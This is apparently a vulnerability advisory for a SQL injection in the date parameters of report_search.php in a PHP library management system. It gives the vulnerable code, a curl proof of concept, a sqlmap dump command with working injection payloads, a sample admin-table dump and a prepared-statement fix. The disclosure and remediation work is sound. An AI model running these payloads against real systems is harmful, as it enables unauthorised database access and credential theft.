# Advanced-Library-Management-System-Project-in-PHP-with-Barcode-report_search.php


## SQL Injection Vulnerability in `report_search.php` (parameter: `dateto`)

- **Vendor:** ProjectWorlds
- **Product:** Advanced Library Management System Project in PHP with Barcode
- **Affected Version:** 1.0 (master branch)
- **Vendor Homepage:** https://projectworlds.com/advanced-library-management-system-project-in-php-with-barcode/
- **Vulnerability Type:** SQL Injection (CWE-89)
- **Affected File:** `report_search.php`
- **Affected Parameters:** `dateto`, `datefrom`
- **CVSS Score:** 8.5 (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
- **Discover Date:** 2026-10-07
- **Researcher:** Shailendra Mourya (CyberShailendra)
- **Researcher Website:** https://cybershailendra.cyou
- **Entry:** VDB-*****
- **CVE ID:** CVE-2026-***
- **Test Environment:** Local VMware lab (CyberShailendra VM), Apache 2.4.58, PHP 8.0.30, MySQL ≥5.1 (MariaDB fork), Windows host
- **Tool Chain:** Manual `curl`/Burp verification + `sqlmap` automated confirmation & dump

---

## Summary
`report_search.php` builds its SQL query by directly concatenating the `datefrom` and `dateto` POST parameters into a `BETWEEN` clause without sanitization, parameterization, or escaping. This allows full boolean-based, error-based, time-based, and UNION-based SQL injection, enabling complete extraction of the `admin` table (including plaintext passwords).

## Vulnerable Code (Logic Point)
```php
// report_search.php
$_SESSION['datefrom'] = $_POST['datefrom'];
$_SESSION['dateto']   = $_POST['dateto'];

$result = mysqli_query($con,
    "SELECT * FROM report
     LEFT JOIN book ON report.book_id = book.book_id
     LEFT JOIN user ON report.user_id = user.user_id
     WHERE date_transaction BETWEEN '".$_POST['datefrom']." 00:00:01'
                                 AND '".$_POST['dateto']." 23:59:59'
     ORDER BY report.report_id DESC"
);
```

**Bug class:** CWE-89 (SQL Injection), root cause CWE-20 (Improper Input Validation).

**Why it's exploitable:**
- User input lands directly **inside single quotes** in the raw SQL string.
- No `mysqli_real_escape_string()`, no `mysqli_prepare()` / `bind_param()`.
- The triple `LEFT JOIN` (report → book → user) means a UNION injection can pull data from **any table in the database**, not just the three joined ones — `UNION SELECT` is not restricted to joined tables.

## Proof of Concept

### Manual (curl)
```bash
curl -b cookie.txt \
  --data-urlencode "datefrom=2024-01-01" \
  --data-urlencode "dateto=2024-12-31' AND '1'='1" \
  --data-urlencode "submit=1" \
  "http://<domain>/report_search.php"
```

### Automated (sqlmap) — actual run output
```bash
sqlmap -u "http://<domain>/report_search.php" \
  --cookie="PHPSESSID=<session>" \
  --data="datefrom=2024-01-01&dateto=2024-12-31&submit=1" \
  -p dateto --batch --level=5 --risk=3 -D project_library -T admin --dump
```

Confirmed injection points:
```text
Parameter: dateto (POST)
    Type: boolean-based blind
    Payload: datefrom=2024-01-01&dateto=2024-12-31' AND 4929=(SELECT (CASE WHEN (4929=4929) THEN 4929 ELSE (SELECT 4122 UNION SELECT 4242) END))-- -&submit=1

    Type: error-based
    Payload: datefrom=2024-01-01&dateto=2024-12-31' AND EXTRACTVALUE(7909,CONCAT(0x5c,0x7178767871,(SELECT (ELT(7909=7909,1))),0x7176707871))-- -&submit=1

    Type: time-based blind
    Payload: datefrom=2024-01-01&dateto=2024-12-31' AND (SELECT 1372 FROM (SELECT(SLEEP(5)))NUOu)-- -&submit=1

    Type: UNION query
    Title: Generic UNION query (NULL) - 34 columns
```

**Result — full `admin` table dumped:**

| admin_id | email_id | adhaar_id | contact | lastname | password | username | firstname | admin_type |
|---|---|---|---|---|---|---|---|---|
| 1 | johndoe@example.com | 123456789012 | 9876543210 | Doe | **admin123** | admin | John | Admin |
| 2 | janesmith@example.com | 210987654321 | 9876543211 | Smith | **librarian123** | jane.librarian | Jane | Librarian |

Backend confirmed: **MySQL ≥5.1 (MariaDB fork)**, Apache 2.4.58, PHP 8.0.30, Windows host.

### Proof Screenshot
![SQL Injection Confirmation - Report 1](Screenshot/1_report.png)

## Impact
- **CVSS 3.1 estimate: 8.5 (High)** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` (requires low-privilege/librarian auth, but yields full admin credential disclosure → privilege escalation to admin).
- Full database read access (any table, any column) via UNION.
- Plaintext admin/librarian password disclosure → direct account takeover.
- PII disclosure: Aadhaar ID, contact numbers, email addresses of all admins/members.

## Remediation
```php
$stmt = mysqli_prepare($con,
  "SELECT * FROM report LEFT JOIN book ON report.book_id=book.book_id
   LEFT JOIN user ON report.user_id=user.user_id
   WHERE date_transaction BETWEEN ? AND ?");
mysqli_stmt_bind_param($stmt, "ss", $datefrom_full, $dateto_full);
mysqli_stmt_execute($stmt);
```
Also validate `datefrom`/`dateto` match `^\d{4}-\d{2}-\d{2}$` before use (defense in depth).



